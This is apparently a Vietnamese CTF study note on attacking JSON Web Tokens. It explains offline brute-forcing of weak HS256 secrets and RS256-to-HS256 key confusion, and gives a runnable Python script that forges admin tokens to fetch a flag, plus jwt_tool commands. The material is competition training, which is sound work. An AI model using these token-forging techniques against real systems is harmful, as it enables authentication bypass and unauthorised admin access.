# JWT Attacks (sâu hơn) — brute-force secret và đánh lừa thuật toán ký

File `02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md` đã có 1 bài JWT cơ bản: sửa token thành `alg: none` (không ký gì cả) rồi gửi đi. Bài này đi thêm 2 kiểu tấn công JWT khác, dùng khi `alg: none` bị chặn (thư viện mới của server thường không cho dùng `none` nữa):

1. **Brute-force secret**: JWT kiểu HS256 ký bằng 1 chuỗi bí mật (secret) do server tự chọn. Nếu chuỗi đó ngắn hoặc dễ đoán (kiểu "secret", "123456", tên challenge), bạn thử hết 1 danh sách từ phổ biến ngay trên máy mình (không cần gửi request lên server từng lần) — đoán đúng là tự ký được token admin.
2. **Key confusion (đổi RS256 sang HS256)**: JWT kiểu RS256 ký bằng 1 khoá riêng (chỉ server biết) và kiểm tra bằng 1 khoá chung (thường công khai, đôi khi server tự để lộ qua 1 đường dẫn kiểu `/.well-known/jwks.json`). Một số thư viện kiểm tra JWT phía server viết cẩu thả: dùng chung 1 biến "khoá" cho cả 2 kiểu kiểm tra. Nếu bạn đổi header JWT từ `alg: RS256` sang `alg: HS256`, rồi tự ký lại bằng chính nội dung khoá công khai đó (coi nó như 1 chuỗi bí mật bình thường), server sẽ lấy đúng khoá công khai đó ra kiểm tra kiểu HS256 — và vì bạn vừa ký bằng đúng chuỗi đó, chữ ký khớp, server tin là hợp lệ.

Trên Burp bạn nhận ra lỗi này khi: cookie/header `Authorization: Bearer eyJ...` (luôn bắt đầu `eyJ`), decode phần giữa (payload) thấy claim như `role`, `is_admin`; thử `alg: none` nhưng bị từ chối (dấu hiệu nên chuyển sang brute-force hoặc key confusion); header có `"alg":"RS256"` và app có endpoint lộ public key (dấu hiệu rõ cho key confusion).

## Cài trước ngày thi (không có Internet lúc thi)

```bash
pip install pyjwt
# jwt_tool (dò + brute-force tự động, có sẵn wordlist jwt-common.txt) -- nếu chưa có:
git clone --depth 1 https://github.com/ticarpi/jwt_tool.git ~/hoc/CTF/Tools/web/jwt_tool
pip install -r ~/hoc/CTF/Tools/web/jwt_tool/requirements.txt
```

## Snippet copy-là-chạy

```python
import re

import jwt
import requests

base = "http://target"
s = requests.Session()
s.verify = False

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

# Danh sách secret thường gặp trong CTF -- thử cục bộ trước khi gửi request nào lên server
COMMON_SECRETS = ["secret", "123456", "ctf2026", "changeme", "dev", "test", "password"]


def brute_force_secret(token):
    # Thử giải mã + verify chữ ký bằng từng secret trong danh sách -- hoàn toàn cục bộ, không tốn request
    for secret in COMMON_SECRETS:
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            return secret  # verify không lỗi -> secret này đúng
        except jwt.InvalidTokenError:
            continue  # sai secret, thử tiếp
    return None


def key_confusion_rs256_to_hs256(public_key_pem: str, payload: dict) -> str:
    # Tự ký token mới bằng HS256, dùng CHÍNH nội dung public key (dạng PEM) làm "secret"
    # Server nếu verify kiểu HS256 bằng cùng biến key -- sẽ lấy đúng public key này ra so khớp -> khớp
    return jwt.encode(payload, public_key_pem, algorithm="HS256")


def solve_one(session, base_url):
    # Bước 1: đăng nhập user thường để lấy 1 token hợp lệ làm mẫu
    r1 = session.post(f"{base_url}/login", data={"username": "user", "password": "user"}, timeout=5)
    token = session.cookies.get("token") or r1.json().get("token")
    if not token:
        return None

    # --- Hướng A: brute-force secret (HS256) -- thử trước vì nhanh, không cần endpoint phụ ---
    secret = brute_force_secret(token)
    if secret:
        new_token = jwt.encode({"user": "admin", "role": "admin"}, secret, algorithm="HS256")
        r2 = session.get(f"{base_url}/admin/flag", headers={"Authorization": f"Bearer {new_token}"}, timeout=5)
        m = FLAG_RE.search(r2.text)
        if m:
            return m.group(0)

    # --- Hướng B: key confusion RS256 -> HS256 -- chỉ thử nếu A không ăn ---
    try:
        r3 = session.get(f"{base_url}/.well-known/jwks.json", timeout=5)
        public_key_pem = r3.json().get("public_key") or r3.text  # tuỳ app, có thể cần sửa key lấy JSON
    except Exception:
        public_key_pem = None

    if public_key_pem:
        new_token2 = key_confusion_rs256_to_hs256(public_key_pem, {"user": "admin", "role": "admin"})
        r4 = session.get(f"{base_url}/admin/flag", headers={"Authorization": f"Bearer {new_token2}"}, timeout=5)
        m = FLAG_RE.search(r4.text)
        if m:
            return m.group(0)

    return None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- **`jwt.decode(token, secret, algorithms=["HS256"])`**: hàm của thư viện `pyjwt` — thử giải mã VÀ kiểm tra chữ ký cùng lúc. Nếu secret sai, nó ném lỗi `jwt.InvalidTokenError` (bọc trong `try/except` để không dừng cả vòng lặp — xem `00_Bat_Dau_Tu_Zero.md` mục 3.9).
- **Vì sao brute-force secret làm CỤC BỘ**: thử hết `COMMON_SECRETS` ngay trong Python, không gửi request nào ra ngoài — chỉ khi đã tìm đúng secret mới gửi 1 request lên server để lấy flag. Nhanh hơn và không làm WAF để ý (xem thêm `02_Chuoi_Request/05_Tinh_Toan_Cuc_Bo.md` mục 2).
- **`key_confusion_rs256_to_hs256`**: đổi thuật toán ký từ RS256 (khoá riêng/khoá chung) sang HS256 (1 chuỗi bí mật chung) bằng cách coi nguyên văn nội dung khoá công khai (kể cả dòng `-----BEGIN PUBLIC KEY-----`) như là "secret". `jwt.encode(payload, public_key_pem, algorithm="HS256")` tự làm việc ký, bạn không cần tự viết thuật toán HMAC tay.
- Danh sách `COMMON_SECRETS` ở trên chỉ là ví dụ ngắn — nếu không ăn, dùng `jwt_tool` với wordlist dài hơn: `python3 jwt_tool.py "<token>" -C -d jwt-common.txt` (chạy trong `~/hoc/CTF/Tools/web/jwt_tool/`), rồi copy secret tìm được vào script.

## Lưu ý nhanh

- Luôn thử theo thứ tự: `alg: none` (xem bài cơ bản) → brute-force secret → key confusion. Đừng nhảy thẳng vào key confusion nếu chưa thử 2 cái trước, vì key confusion cần có endpoint lộ public key mới dùng được.
- Nếu `key confusion` không ăn dù có đúng public key: có thể thư viện server đã vá lỗi này (ép cứng `algorithms=["RS256"]` khi verify, không đọc `alg` từ token) — không còn cách này, chuyển hướng khác.
- Secret tìm được thường GIỐNG NHAU ở mọi đội (vì cùng 1 service, secret hardcode trong source) — chỉ cần brute-force 1 lần, dùng lại cho các đội khác.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
